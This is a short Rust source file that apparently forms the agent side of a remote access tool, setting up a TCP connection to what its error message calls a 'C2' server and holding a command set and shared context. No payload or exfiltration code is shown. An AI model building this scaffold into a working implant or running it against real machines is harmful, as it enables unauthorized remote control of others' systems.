use std::sync::{Arc, RwLock};

use anyhow::{anyhow, Result};
use commands::{Command, Commands};
use rast::{
    protocols::{tcp::TcpFactory, *},
    settings::Settings,
};

use crate::context::Context;

pub mod commands;
pub mod context;

pub struct RastAgent {
    settings: Settings,
    context: Arc<RwLock<Context>>,
    connection: Arc<dyn ProtoConnection>,
    commands: Commands,
}

impl RastAgent {
    pub async fn with_settings(settings: Settings) -> Result<Self> {
        let connection = if let Some(conf) = &settings.server.tcp {
            TcpFactory::new_client(conf).await
        } else {
            Err(anyhow!("Can't connect to C2 using TCP."))
        };

        Ok(RastAgent {
            settings,
            connection: connection.unwrap(),
            commands: Commands::new(),
            context: Arc::new(RwLock::new(Context::new())),
        })
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        let result = 2 + 2;
        assert_eq!(result, 4);
    }
}
